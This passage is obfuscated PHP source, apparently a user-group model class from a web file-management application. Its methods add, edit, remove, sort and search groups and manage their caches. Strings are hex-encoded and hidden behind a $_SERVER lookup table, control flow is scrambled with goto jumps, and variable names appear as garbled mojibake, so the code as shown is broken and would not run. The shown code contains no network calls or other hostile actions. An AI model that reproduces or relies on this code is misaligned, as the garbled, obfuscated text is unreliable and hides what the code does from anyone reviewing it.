"\x67\x72\157\x75\160\x5f\x6d\145\164\x61", "\x6d\x65\164\141\x46\151\145\x6c\144" => "\x67\162\157\165\160\x49\x44"); protected function cacheFunctionAlias($AﬂóŸó´É∞) { $F–Ë§ÊÌªÉ =& $_SERVER[ú∫]; return array($F–Ë§ÊÌªÉ[1762] => array($AﬂóŸó´É∞[0], $F–Ë§ÊÌªÉ[1763]), $F–Ë§ÊÌªÉ[1764] => array($AﬂóŸó´É∞[0], $F–Ë§ÊÌªÉ[1763])); } protected function getInfo($f◊∂à¶€–ﬁ) { $cÕﬂªÙ© ƒ = $this->getInfoSimple($f◊∂à¶€–ﬁ); if (!$cÕﬂªÙ© ƒ) { return !1; } return $this->_listDataApplyItem($cÕﬂªÙ© ƒ); } protected function getInfoSimple($D§±Ö® Ø™, $dïÌ≥Ÿî¶î = false) { $A…◊®ó˘˘À =& $_SERVER[ú∫]; if ($dïÌ≥Ÿî¶î) { $b¬πûÜﬁ√† = array($A…◊®ó˘˘À[1692] => intval($D§±Ö® Ø™)); $E®ó±∞◊“∞ = $this->where($b¬πûÜﬁ√†)->find(); return is_array($E®ó±∞◊“∞) ? $E®ó±∞◊“∞ : array(); } return $this->cacheFunctionGet($A…◊®ó˘˘À[1765], $D§±Ö® Ø™); } protected function groupAdd($d˜ﬂóäﬁ≠ï) { goto eìÃîÙ∆êÇ; eìÃîÙ∆êÇ: $D‰√¡àæËõ =& $_SERVER[ú∫]; if (!$d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[478]] && isset($d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1692]]) && $d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1692]] == 1) { if ($fŒÛ‚ëﬁê = $this->getInfoSimple($d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1692]], !0)) { return $d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1692]]; } } else { $fŒÛ‚ëﬁê = $this->getInfoSimple($d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[478]]); if (!$fŒÛ‚ëﬁê) { return !1; } } $eÓ∆Çò“πÏ = $D‰√¡àæËõ[498]; goto D†À∏ÊØàÔ; fÛáŸ∞Éëû: if (!empty($d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1692]])) { $dÃÍ„ı‹Ô«[$D‰√¡àæËõ[1692]] = $d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1692]]; } $C¿Â·å›Ô¬ = $this->add($dÃÍ„ı‹Ô«); $this->setNamePinyin($C¿Â·å›Ô¬, $dÃÍ„ı‹Ô«[$D‰√¡àæËõ[28]]); goto A®Œâèªüå; A®Œâèªüå: if (isset($d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1768]])) { $this->metaSet($C¿Â·å›Ô¬, array($D‰√¡àæËõ[1768] => $d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1768]], $D‰√¡àæËõ[1769] => $d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1769]])); unset($d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1768]]); unset($d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1769]]); } Model($D‰√¡àæËõ[1206])->groupRootAdd($C¿Â·å›Ô¬); return $C¿Â·å›Ô¬; goto b®œàëíö…; D†À∏ÊØàÔ: if ($fŒÛ‚ëﬁê[$D‰√¡àæËõ[487]]) { $eÓ∆Çò“πÏ = $fŒÛ‚ëﬁê[$D‰√¡àæËõ[487]] . $fŒÛ‚ëﬁê[$D‰√¡àæËõ[1692]] . $D‰√¡àæËõ[47]; } $dÃÍ„ı‹Ô« = array($D‰√¡àæËõ[413] => $this->groupNameAuto($d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[478]], $d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[28]]), $D‰√¡àæËõ[394] => $d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[478]], $D‰√¡àæËõ[553] => $eÓ∆Çò“πÏ, $D‰√¡àæËõ[1766] => $d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1676]], $D‰√¡àæËõ[1767] => 0, $D‰√¡àæËõ[1696] => 0); if (isset($d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1715]])) { $dÃÍ„ı‹Ô«[$D‰√¡àæËõ[1715]] = $d˜ﬂóäﬁ≠ï[$D‰√¡àæËõ[1715]]; } else { $Dµ¡√ß—®û = $this->max($D‰√¡àæËõ[1715]); if (!$Dµ¡√ß—®û) { $Dµ¡√ß—®û = 0; } $dÃÍ„ı‹Ô«[$D‰√¡àæËõ[1715]] = $Dµ¡√ß—®û + 1; } goto fÛáŸ∞Éëû; b®œàëíö…: } protected function groupEdit($eˆÔ√Ωà‹, $EàÂπ´˘€±) { goto dËÛÆ≈Ëƒù; dËÛÆ≈Ëƒù: $F…Ö†Ìë‰÷ =& $_SERVER[ú∫]; $b“ïîà°˜Ë = $this->getInfoSimple($eˆÔ√Ωà‹); if (!$b“ïîà°˜Ë) { return !1; } goto Cë¿ëﬂ‰≈Á; DﬂÃÕÆóÁ∏: if (isset($EàÂπ´˘€±[$F…Ö†Ìë‰÷[28]]) && $EàÂπ´˘€±[$F…Ö†Ìë‰÷[28]] != $b“ïîà°˜Ë[$F…Ö†Ìë‰÷[28]]) { $this->_clearChildrenCache($b“ïîà°˜Ë); } return $this->where(array($F…Ö†Ìë‰÷[1770] => $eˆÔ√Ωà‹))->save($EàÂπ´˘€±); goto føéàÂÚø“; Cë¿ëﬂ‰≈Á: if (!empty($EàÂπ´˘€±[$F…Ö†Ìë‰÷[478]])) { $D∫Ÿ∆Ë……î = $this->getInfoSimple($EàÂπ´˘€±[$F…Ö†Ìë‰÷[478]]); if (!$D∫Ÿ∆Ë……î) { return !1; } if ($b“ïîà°˜Ë[$F…Ö†Ìë‰÷[1692]] == $D∫Ÿ∆Ë……î[$F…Ö†Ìë‰÷[1692]]) { return !1; } if ($EàÂπ´˘€±[$F…Ö†Ìë‰÷[478]] != $b“ïîà°˜Ë[$F…Ö†Ìë‰÷[478]]) { if ($D∫Ÿ∆Ë……î[$F…Ö†Ìë‰÷[487]] !== $b“ïîà°˜Ë[$F…Ö†Ìë‰÷[487]] && strpos($D∫Ÿ∆Ë……î[$F…Ö†Ìë‰÷[487]], $b“ïîà°˜Ë[$F…Ö†Ìë‰÷[487]] . $b“ïîà°˜Ë[$F…Ö†Ìë‰÷[1692]] . $F…Ö†Ìë‰÷[47]) === 0) { return !1; } $EàÂπ´˘€±[$F…Ö†Ìë‰÷[553]] = $D∫Ÿ∆Ë……î[$F…Ö†Ìë‰÷[487]] . $EàÂπ´˘€±[$F…Ö†Ìë‰÷[478]] . $F…Ö†Ìë‰÷[47]; $this->_changeChildLevel($b“ïîà°˜Ë, $D∫Ÿ∆Ë……î); } } if (isset($EàÂπ´˘€±[$F…Ö†Ìë‰÷[28]])) { $this->setNamePinyin($eˆÔ√Ωà‹, $EàÂπ´˘€±[$F…Ö†Ìë‰÷[28]]); } if (isset($EàÂπ´˘€±[$F…Ö†Ìë‰÷[1768]])) { $this->metaSet($eˆÔ√Ωà‹, array($F…Ö†Ìë‰÷[1768] => $EàÂπ´˘€±[$F…Ö†Ìë‰÷[1768]], $F…Ö†Ìë‰÷[1769] => $EàÂπ´˘€±[$F…Ö†Ìë‰÷[1769]])); unset($EàÂπ´˘€±[$F…Ö†Ìë‰÷[1768]]); unset($EàÂπ´˘€±[$F…Ö†Ìë‰÷[1769]]); } goto DﬂÃÕÆóÁ∏; føéàÂÚø“: } private function _clearChildrenCache($E‡„÷è˘Ö ) { $a”≥ëîπ◊∑ =& $_SERVER[ú∫]; $d–Ôóß∑êú = array($a”≥ëîπ◊∑[553] => array($a”≥ëîπ◊∑[512], $E‡„÷è˘Ö [$a”≥ëîπ◊∑[487]] . $E‡„÷è˘Ö [$a”≥ëîπ◊∑[1692]] . $a”≥ëîπ◊∑[513])); $FÚ∆üÖﬁò± = $this->field($a”≥ëîπ◊∑[1692])->where($d–Ôóß∑êú)->select(); foreach ($FÚ∆üÖﬁò± as $EÈ±ƒ¯Èë”) { $this->cacheFunctionClear($a”≥ëîπ◊∑[1771], $EÈ±ƒ¯Èë”[$a”≥ëîπ◊∑[1692]]); $this->cacheFunctionClear($a”≥ëîπ◊∑[1765], $EÈ±ƒ¯Èë”[$a”≥ëîπ◊∑[1692]]); } } private function _changeChildLevel($a Ç˜Ö Ôç, $Båîº©ãóƒ, $fôˆœçíÙ¿ = false) { goto A®óÊ¥Óò›; aÁ‰ÍÙö°∏: if ($fôˆœçíÙ¿) { $dæªŒÖ¶îÈ = $Båîº©ãóƒ[$c°‡≈•„Æ∫[487]] . $Båîº©ãóƒ[$c°‡≈•„Æ∫[1692]] . $c°‡≈•„Æ∫[47]; } $cÈ∑ÕúÔ⁄· = array($c°‡≈•„Æ∫[553] => array($c°‡≈•„Æ∫[512], $a Ç˜Ö Ôç[$c°‡≈•„Æ∫[487]] . $a Ç˜Ö Ôç[$c°‡≈•„Æ∫[1692]] . $c°‡≈•„Æ∫[513])); $Bèó—çê÷¢ = array($c°‡≈•„Æ∫[553] => array($c°‡≈•„Æ∫[561], "\x72\145\x70\154\x61\x63\145\x28\160\141\162\x65\x6e\x74\114\x65\166\145\154\54\x27{$BöÈπÃÁíÓ}\47\54\x27{$dæªŒÖ¶îÈ}\x27\51")); goto açÒôÕ∑Ó›; A®óÊ¥Óò›: $c°‡≈•„Æ∫ =& $_SERVER[ú∫]; $BöÈπÃÁíÓ = $a Ç˜Ö Ôç[$c°‡≈•„Æ∫[487]] . $a Ç˜Ö Ôç[$c°‡≈•„Æ∫[1692]] . $c°‡≈•„Æ∫[47]; $dæªŒÖ¶îÈ = $Båîº©ãóƒ[$c°‡≈•„Æ∫[487]] . $Båîº©ãóƒ[$c°‡≈•„Æ∫[1692]] . $c°‡≈•„Æ∫[47] . $a Ç˜Ö Ôç[$c°‡≈•„Æ∫[1692]] . $c°‡≈•„Æ∫[47]; goto aÁ‰ÍÙö°∏; açÒôÕ∑Ó›: $this->_clearChildrenCache($a Ç˜Ö Ôç); $this->where($cÈ∑ÕúÔ⁄·)->data($Bèó—çê÷¢)->save(); goto DªÓãî™Õ¿; DªÓãî™Õ¿: } public function setNamePinyin($Eá⁄êóáÑÜ, $DÚ¿øÎÕ≥¥ = false) { $a˘€º‹ìÀﬁ =& $_SERVER[ú∫]; if (!$DÚ¿øÎÕ≥¥) { $dÙó»‰’∆ = $this->getInfoSimple($Eá⁄êóáÑÜ); $DÚ¿øÎÕ≥¥ = $dÙó»‰’∆[$a˘€º‹ìÀﬁ[28]]; } if (!Input::check($DÚ¿øÎÕ≥¥, $a˘€º‹ìÀﬁ[556])) { $this->metaSet($Eá⁄êóáÑÜ, $a˘€º‹ìÀﬁ[444], null); $this->metaSet($Eá⁄êóáÑÜ, $a˘€º‹ìÀﬁ[443], null); return; } $Cªõ∫÷ã§º = array($a˘€º‹ìÀﬁ[444] => str_replace($a˘€º‹ìÀﬁ[50], $a˘€º‹ìÀﬁ[33], Pinyin::encode($DÚ¿øÎÕ≥¥)), $a˘€º‹ìÀﬁ[443] => Pinyin::encode($DÚ¿øÎÕ≥¥, $a˘€º‹ìÀﬁ[557])); $this->metaSet($Eá⁄êóáÑÜ, $Cªõ∫÷ã§º); } protected function groupStatus($A∂çã√¢≥ì, $FÓ“ã¯˘µË) { goto aô®¨æ•ë; AãËéó∂Óì: if ($FÓ“ã¯˘µË == $E—‡Ø≥Û∂ä[87]) { $Cû∫ÿ≠˘∂¬ = $this->parentLevelArray($f›Í˜óç‚ı[$E—‡Ø≥Û∂ä[487]]); } else { $f“°À«Í»ﬂ = array($E—‡Ø≥Û∂ä[553] => array($E—‡Ø≥Û∂ä[512], $f›Í˜óç‚ı[$E—‡Ø≥Û∂ä[487]] . $f›Í˜óç‚ı[$E—‡Ø≥Û∂ä[1692]] . $E—‡Ø≥Û∂ä[513])); $Cû∫ÿ≠˘∂¬ = $this->where($f“°À«Í»ﬂ)->field($E—‡Ø≥Û∂ä[1692])->select(); $Cû∫ÿ≠˘∂¬ = array_to_keyvalue($Cû∫ÿ≠˘∂¬, $E—‡Ø≥Û∂ä[33], $E—‡Ø≥Û∂ä[1692]); } $Cû∫ÿ≠˘∂¬[] = $f›Í˜óç‚ı[$E—‡Ø≥Û∂ä[1692]]; $Dùá›£⁄‹ = array(); goto aÜôØ‰±ù≈; aÜôØ‰±ù≈: foreach ($Cû∫ÿ≠˘∂¬ as $A∂çã√¢≥ì) { $Dùá›£⁄‹[] = array($E—‡Ø≥Û∂ä[1692] => $A∂çã√¢≥ì, $E—‡Ø≥Û∂ä[93] => $E—‡Ø≥Û∂ä[710], $E—‡Ø≥Û∂ä[372] => $FÓ“ã¯˘µË); } return Model($E—‡Ø≥Û∂ä[1772])->addAll($Dùá›£⁄‹, array(), !0); goto AÖíÇ∞µÙ¯; aô®¨æ•ë: $E—‡Ø≥Û∂ä =& $_SERVER[ú∫]; $f›Í˜óç‚ı = $this->getInfoSimple($A∂çã√¢≥ì); if (!$f›Í˜óç‚ı) { return !1; } goto AãËéó∂Óì; AÖíÇ∞µÙ¯: } protected function groupRemove($Fõÿ»ÈÙÇÉ) { goto E€·«õΩ’∏; f¶‰…›ÿ∂: $this->where(array($bíƒª„ëÛÖ[478] => $Fõÿ»ÈÙÇÉ))->save(array($bíƒª„ëÛÖ[478] => $E‰¯¥ØÚÈè[$bíƒª„ëÛÖ[478]])); Model($bíƒª„ëÛÖ[1772])->where($A´ÇÏœ¡†î)->delete(); Model($bíƒª„ëÛÖ[1773])->where($A´ÇÏœ¡†î)->delete(); goto bø∏‰áìë™; E€·«õΩ’∏: $bíƒª„ëÛÖ =& $_SERVER[ú∫]; $A´ÇÏœ¡†î = array($bíƒª„ëÛÖ[1692] => $Fõÿ»ÈÙÇÉ); $E‰¯¥ØÚÈè = $this->where($A´ÇÏœ¡†î)->find(); goto e∏‹Ì≤•éÂ; bø∏‰áìë™: Model($bíƒª„ëÛÖ[790])->groupRootRemove($Fõÿ»ÈÙÇÉ); return $this->where($A´ÇÏœ¡†î)->delete(); goto D”å≤⁄Õáì; e∏‹Ì≤•éÂ: if (!$E‰¯¥ØÚÈè || $E‰¯¥ØÚÈè[$bíƒª„ëÛÖ[478]] == 0) { return !1; } $Eëãú„äÒƒ = $this->getInfoSimple($E‰¯¥ØÚÈè[$bíƒª„ëÛÖ[478]]); $this->_changeChildLevel($E‰¯¥ØÚÈè, $Eëãú„äÒƒ, !0); goto f¶‰…›ÿ∂; D”å≤⁄Õáì: } protected function groupSort($eÇÍé¯–øÑ) { $BÆ◊œ©å›á =& $_SERVER[ú∫]; $eâ‘Ñ€ä‹© = array(); foreach ($eÇÍé¯–øÑ as $fÊ‰Îﬁ™äÜ => $CåëÜ¢«ñ) { $eâ‘Ñ€ä‹©[] = array($BÆ◊œ©å›á[1692], $CåëÜ¢«ñ, $BÆ◊œ©å›á[1715], $fÊ‰Îﬁ™äÜ + 1); } $this->saveAll($eâ‘Ñ€ä‹©); } public function listData() { $c‚¡ÔŒ√ò» = $this->_makeOrder()->selectPage(50); $this->_listDataApply($c‚¡ÔŒ√ò»[$_SERVER[ú∫][367]]); return $c‚¡ÔŒ√ò»; } private function _makeOrder($AÑÀÉíÚÏø = '') { goto eæÉΩ¥ı¿…; AÔ∂òŒÿÏ: $B„ÌüÆÛÍ¯ = Input::get($cÖƒÿΩ‡ãƒ[435], $cÖƒÿΩ‡ãƒ[7], $cÖƒÿΩ‡ãƒ[1696], $D•èÎ·œ Æ); $FâüﬁÑ∏á¶ = Input::get($cÖƒÿΩ‡ãƒ[436], $cÖƒÿΩ‡ãƒ[7], $cÖƒÿΩ‡ãƒ[1774], array($cÖƒÿΩ‡ãƒ[1774], $cÖƒÿΩ‡ãƒ[430])); $FâüﬁÑ∏á¶ = $E≈ã⁄©œÕ“[$FâüﬁÑ∏á¶]; goto E©¥åÕ…°·; eæÉΩ¥ı¿…: $cÖƒÿΩ‡ãƒ =& $_SERVER[ú∫]; $D•èÎ·œ Æ = array($cÖƒÿΩ‡ãƒ[1692], $cÖƒÿΩ‡ãƒ[28], $cÖƒÿΩ‡ãƒ[1678], $cÖƒÿΩ‡ãƒ[194]); $E≈ã⁄©œÕ“ = array($cÖƒÿΩ‡ãƒ[428] => $cÖƒÿΩ‡ãƒ[429], $cÖƒÿΩ‡ãƒ[430] => $cÖƒÿΩ‡ãƒ[431]); goto AÔ∂òŒÿÏ; E©¥åÕ…°·: $AÑÀÉíÚÏø = $AÑÀÉíÚÏø . "{$B„ÌüÆÛÍ¯}\40{$FâüﬁÑ∏á¶}\54\40\x67\x72\x6f\x75\160\x49\104\40\x61\163\x63"; return $this->order($AÑÀÉíÚÏø); goto e÷Õü∑å™; e÷Õü∑å™: } public function listChild($F®—ƒ∑¬å˜) { $D¢±†ÌÀ¥ß =& $_SERVER[ú∫]; $câëÁÒ°ÌÉ = $this->where(array($D¢±†ÌÀ¥ß[478] => $F®—ƒ∑¬å˜))->_makeOrder()->selectPage(200); $this->_listDataApply($câëÁÒ°ÌÉ[$D¢±†ÌÀ¥ß[367]]); return $câëÁÒ°ÌÉ; } public function listByID($dëêﬁî€ú„) { $cΩ‘Ô†ô•ó =& $_SERVER[ú∫]; if (!$dëêﬁî€ú„) { return array(); } $Dùèåú÷⁄ø = array($cΩ‘Ô†ô•ó[1692] => array($cΩ‘Ô†ô•ó[7], $dëêﬁî€ú„)); $f≈⁄‘å’éµ = $this->where($Dùèåú÷⁄ø)->select(); $this->_listDataApply($f≈⁄‘å’éµ); return $f≈⁄‘å’éµ; } public function listSearch($e§ûéé±„∂) { goto c∏õú¬∂ç⁄; b›ˆ¶»ﬂÑ¬: if ($A€üÿ–óåÇ) { $FÎ´çÆ©Ñ¢ = $this->getInfoSimple($A€üÿ–óåÇ); $cìÁ¨ñªÌı = $FÎ´çÆ©Ñ¢[$DƒîÌ∆›ñ˜[487]] . $A€üÿ–óåÇ . $DƒîÌ∆›ñ˜[513]; $bÎ‚œÌñÍÙ = array($bÎ‚œÌñÍÙ, array($DƒîÌ∆›ñ˜[487] => array($DƒîÌ∆›ñ˜[380], $cìÁ¨ñªÌı))); } $bÎ‚œÌñÍÙ = $this->parseWhereLike($bÎ‚œÌñÍÙ); $BàÉè≥Ÿ“‹ = $this->_makeOrder()->where($bÎ‚œÌñÍÙ)->selectPage(20); goto EÉ†∆ŒÛﬁô; EÉ†∆ŒÛﬁô: $BàÉè≥Ÿ“‹ = $BàÉè≥Ÿ“‹ ? $BàÉè≥Ÿ“‹ : array($DƒîÌ∆›ñ˜[367] => array(), $DƒîÌ∆›ñ˜[364] => array()); if (!$BàÉè≥Ÿ“‹ || count($BàÉè≥Ÿ“‹[$DƒîÌ∆›ñ˜[367]]) < 5 && Input::check($a¢°Õ˘€Õñ, $DƒîÌ∆›ñ˜[316])) { goto DÇÈﬁÓ¿§ù; dÀ∏™Ç˜éì: $B∏ÑÙßﬂ≈‡ = array_merge($eÒë«¬ÒÌù, $fãô£≠ï¬É, $BàÉè≥Ÿ“‹[$DƒîÌ∆›ñ˜[367]]); $BàÉè≥Ÿ“‹[$DƒîÌ∆›ñ˜[367]] = array_unique_by_key($B∏ÑÙßﬂ≈‡, $DƒîÌ∆›ñ˜[1692]); $BàÉè≥Ÿ“‹[$DƒîÌ∆›ñ˜[364]][$DƒîÌ∆›ñ˜[365]] = count($BàÉè≥Ÿ“‹[$DƒîÌ∆›ñ˜[367]]); goto CΩöÍçâ¥‡; CΩöÍçâ¥‡: $BàÉè≥Ÿ“‹[$DƒîÌ∆›ñ˜[364]][$DƒîÌ∆›ñ˜[366]] = ceil($BàÉè≥Ÿ“‹[$DƒîÌ∆›ñ˜[364]][$DƒîÌ∆›ñ˜[365]] / $BàÉè≥Ÿ“‹[$DƒîÌ∆›ñ˜[364]][$DƒîÌ∆›ñ˜[361]]); goto D◊Çô∏ö«À; DÇÈﬁÓ¿§ù: $A·È±«øÁé = $this->groupChildrenAll($A€üÿ–óåÇ); $eÒë«¬ÒÌù = $this->_searchFromMeta($DƒîÌ∆›ñ˜[443], $a¢°Õ˘€Õñ, 10, $A·È±«øÁé); $fãô£≠ï¬É = $this->_searchFromMeta($DƒîÌ∆›ñ˜[444], $a¢°Õ˘€Õñ, 10, $A·È±«øÁé); goto dÀ∏™Ç˜éì; D◊Çô∏ö«À: } $this->_listDataApply($BàÉè≥Ÿ“‹[$DƒîÌ∆›ñ˜[367]]); goto F‡àÙà≠ä©; F‡àÙà≠ä©: return $BàÉè≥Ÿ“‹; goto fñ⁄˜˘à≠”; c∏õú¬∂ç⁄: $DƒîÌ∆›ñ˜ =& $_SERVER[ú∫]; $a¢°Õ˘€Õñ = $e§ûéé±„∂[$DƒîÌ∆›ñ˜[1775]]; $A€üÿ–óåÇ = isset($e§ûéé±„∂[$DƒîÌ∆›ñ˜[1776]]) ? $e§ûéé±„∂[$DƒîÌ∆›ñ˜[1776]] : !1; goto B¥Ÿá¿¢ÃÆ; B¥Ÿá¿¢ÃÆ: if (!trim($a¢°Õ˘€Õñ)) { return !1; } $a¢°Õ˘€Õñ = str_replace($DƒîÌ∆›ñ˜[1777], $DƒîÌ∆›ñ˜[1778], $a¢°Õ˘€Õñ); $bÎ‚œÌñÍÙ = array($DƒîÌ∆›ñ˜[1692] => array($DƒîÌ∆›ñ˜[380], "{$a¢°Õ˘€Õñ}\x25"), $DƒîÌ∆›ñ˜[28] => array($DƒîÌ∆›ñ˜[380], "\x25{$a¢°Õ˘€Õñ}\45"), $DƒîÌ∆›ñ˜[957] => $DƒîÌ∆›ñ˜[1779]); goto b›ˆ¶»ﬂÑ¬; fñ⁄˜˘à≠”: } protected function groupChildrenAll($b®»¨«Ö¿´) { $E∆œﬂ¢à≈Ó =& $_SERVER[ú∫]; if (!$b®»¨«Ö¿´) { return !1; } if (is_string($b®»¨«Ö¿´)) { $b®»¨«Ö¿´ = array($b®»¨«Ö¿´); } $bÇü®ﬂ≥‰© = $b®»¨«Ö¿´; foreach ($b®»¨«Ö¿´ as $e‡√π¿ıË√) { $c€Ü…≥ﬂ⁄ä = $this->getInfoSimple($e‡√π¿ıË√); $cïﬁÁƒ‘–¯ = array($E∆œﬂ¢à≈Ó[487] => array($E∆œﬂ¢à≈Ó[380], $c€Ü…≥ﬂ⁄ä[$E∆œﬂ¢à≈Ó[487]] . $e‡√π¿ıË√ . $E∆œﬂ¢à≈Ó[513])); $C…ëÑ≈µ∑Á = $this->field($E∆œﬂ¢à≈Ó[1692])->where($cïﬁÁƒ‘–¯)->select(); $bÇü®ﬂ≥‰© = array_merge($bÇü®ﬂ≥‰©, array_to_keyvalue($C…ëÑ≈µ∑Á, $E∆œﬂ¢à≈Ó[33], $E∆œﬂ¢à≈Ó[1692])); } return array_unique($bÇü®ﬂ≥‰©); } private function _searchFromMeta($D˜”ã∑ùÿò, $c”∏˜¯‹Ô´, $bÆÔ•ü¨Æ™, $bÚ˘∆ì¯¯ô) { goto D„Ì§Øªàº; D„Ì§Øªàº: $F˜ñÚ«Áò‹ =& $_SERVER[ú∫]; $c”∏˜¯‹Ô´ = strtolower($c”∏˜¯‹Ô´); $d‰ö™ﬁ√”Ù = array($F˜ñÚ«Áò‹[93] => $D˜”ã∑ùÿò, $F˜ñÚ«Áò‹[372] => array($F˜ñÚ«Áò‹[380], "\45{$c”∏˜¯‹Ô´}\45")); goto f“„®¬√ä⁄; C∂Ø™ÿ”äë: if (!$cÓ¨Œé ‡ö) { return array(); } return $cÓ¨Œé ‡ö; goto a”¿—á˜∂Æ; f“„®¬√ä⁄: $d‰ö™ﬁ√”Ù = $this->parseWhereLike($d‰ö™ﬁ√”Ù); if ($bÚ˘∆ì¯¯ô) { $d‰ö™ﬁ√”Ù[$F˜ñÚ«Áò‹[1692]] = array($F˜ñÚ«Áò‹[7], $bÚ˘∆ì¯¯ô); } $A”êäæ–î· = Model($F˜ñÚ«Áò‹[1780])->where($d‰ö™ﬁ√”Ù)->limit($bÆÔ•ü¨Æ™)->select(); goto A˘®ã≠ñüí; A˘®ã≠ñüí: if (!$A”êäæ–î·) { return array(); } $A”êäæ–î· = array_to_keyvalue($A”êäæ–î·, $F˜ñÚ«Áò‹[33], $F˜ñÚ«Áò‹[1692]); $cÓ¨Œé ‡ö = $this->where(array($F˜ñÚ«Áò‹[1770] => array($F˜ñÚ«Áò‹[7], $A”êäæ–î·)))->select(); goto C∂Ø™ÿ”äë; a”¿—á˜∂Æ: } protected function _listDataApplyItem($c‚ô∏Èóß˜) { $fÍ™ °èä = array($c‚ô∏Èóß˜); $this->_listDataApply($fÍ™ °èä); return $fÍ™ °èä[0]; } protected function _listDataApply(&$F®œâﬁ◊√¡) { goto Fæ‚Òêﬁøé; Fæ‚Òêﬁøé: $B’ÔæÔä©· =& $_SERVER[ú∫]; if (!$F®œâﬁ◊√¡) { return; } $dã’ìªçö˜ = array_to_keyvalue($F®œâﬁ◊√¡, $B’ÔæÔä©·[33], $B’ÔæÔä©·[1692]); goto b÷Á¯Ì‡‰ñ; DÏÇÁ”¥ëæ: $this->_listAppendParent($F®œâﬁ◊√¡); $this->_listAppendSourceRoot($F®œâﬁ◊√¡, $dã’ìªçö˜); goto EπŸº€¡Ïù; b÷Á¯Ì‡‰ñ: $this->_listAppendChildren($F®œâﬁ◊√¡); $this->_listAppendChildrenMember($F®œâﬁ◊√¡); $this->_listAppendMeta($F®œâﬁ◊√¡, $dã’ìªçö˜); goto DÏÇÁ”¥ëæ; EπŸº€¡Ïù: } private function _listAppendChildren(&$CÜÛ™¶Ø‹È) { goto f¯á≤…ßãÑ; e«◊ıÈ™ó±: $DâÉ∏Øôπå = array($fìªÔ·„¨â[478], $fìªÔ·„¨â[1781] => $fìªÔ·„¨â[480]); $A°î‰≈ﬁ‰ = $this->field($DâÉ∏Øôπå)->where($búêí•ùûµ)->group($fìªÔ·„¨â[478])->select(); $FÊ‹Ÿü¯œÜ = array_to_keyvalue($A°î‰≈ﬁ‰, $fìªÔ·„¨â[478], $fìªÔ·„¨â[480]); goto E¬øÑëèŒÉ; E¬øÑëèŒÉ: foreach ($CÜÛ™¶Ø‹È as &$f•˜ˆàﬂ‚Ì) { $Eü≈Ì›≤‰ú = $f•˜ˆàﬂ‚Ì[$fìªÔ·„¨â[1692]]; $f•˜ˆàﬂ‚Ì[$fìªÔ·„¨â[1782]] = isset($FÊ‹Ÿü¯œÜ[$Eü≈Ì›≤‰ú]) ? intval($FÊ‹Ÿü¯œÜ[$Eü≈Ì›≤‰ú]) : !1; } unset($f•˜ˆàﬂ‚Ì); goto A«·ë”“©‚; f¯á≤…ßãÑ: $fìªÔ·„¨â =& $_SERVER[ú∫]; $f∆®≤ƒ∂îü = array_to_keyvalue($CÜÛ™¶Ø‹È, $fìªÔ·„¨â[33], $fìªÔ·„¨â[1692]); $búêí•ùûµ = array($fìªÔ·„¨â[478] => array($fìªÔ·„¨â[7], $f∆®≤ƒ∂îü)); goto e«◊ıÈ™ó±; A«·ë”“©‚: } private function _listAppendChildrenMember(&$A·‚ÌÑ›‚√) { goto dÜëñ”ë·–; e¿˜“ÍµÛä: $EÜò÷ÃíÀî = array($aòã∞Ü–≈É[1692], $aòã∞Ü–≈É[1781] => $aòã∞Ü–≈É[480]); $DÇ∂ıÌøèû = Model($aòã∞Ü–≈É[1773])->field($EÜò÷ÃíÀî)->where($AêõâÔΩÓ»)->group($aòã∞Ü–≈É[1692])->select(); $DâÜÃºÿò¥ = array_to_keyvalue($DÇ∂ıÌøèû, $aòã∞Ü–≈É[1692], $aòã∞Ü–≈É[480]); goto Bä√∏´áëû; Bä√∏´áëû: foreach ($A·‚ÌÑ›‚√ as &$aúàÑ·™ƒÙ) { $CØê…ñÛÀ = $aúàÑ·™ƒÙ[$aòã∞Ü–≈É[1692]]; $aúàÑ·™ƒÙ[$aòã∞Ü–≈É[1783]] = isset($DâÜÃºÿò¥[$CØê…ñÛÀ]) ? intval($DâÜÃºÿò¥[$CØê…ñÛÀ]) : !1; } unset($aúàÑ·™ƒÙ); goto Dç∂◊‘ö≠–; dÜëñ”ë·–: $aòã∞Ü–≈É =& $_SERVER[ú∫]; $FêåáÖ„å  = array_to_keyvalue($A·‚ÌÑ›‚√, $aòã∞Ü–≈É[33], $aòã∞Ü–≈É[1692]); $AêõâÔΩÓ» = array($aòã∞Ü–≈É[1692] => array($aòã∞Ü–≈É[7], $FêåáÖ„å )); goto e¿˜“ÍµÛä; Dç∂◊‘ö≠–: } private function _listAppendMeta(&$b¯‡·ÖïÙŒ, $b–ø°∑µÓá) { goto F§Òﬂ⁄Úè¥; a¬Û»ÂççÈ: $aﬂãƒ‰∞Õ’ = array_to_keyvalue_group($aﬂãƒ‰∞Õ’, $EŒ∞‚Ωø¯Ù[1692]); foreach ($aﬂãƒ‰∞Õ’ as &$C∞£Ø—Ù™Ü) { $C∞£Ø—Ù™Ü = array_to_keyvalue($C∞£Ø—Ù™Ü, $EŒ∞‚Ωø¯Ù[93], $EŒ∞‚Ωø¯Ù[372]); } unset($C∞£Ø—Ù™Ü); goto Bèò∑çÉÊı; Bèò∑çÉÊı: foreach ($b¯‡·ÖïÙŒ as &$e…ñ‚Ω¡µá) { $e…ñ‚Ω¡µá[$EŒ∞‚Ωø¯Ù[445]] = array(); if (isset($aﬂãƒ‰∞Õ’[$e…ñ‚Ω¡µá[$EŒ∞‚Ωø¯Ù[1692]]])) { $e…ñ‚Ω¡µá[$EŒ∞‚Ωø¯Ù[445]] = $aﬂãƒ‰∞Õ’[$e…ñ‚Ω¡µá[$EŒ∞‚Ωø¯Ù[1692]]]; } } unset($e…ñ‚Ω¡µá); goto 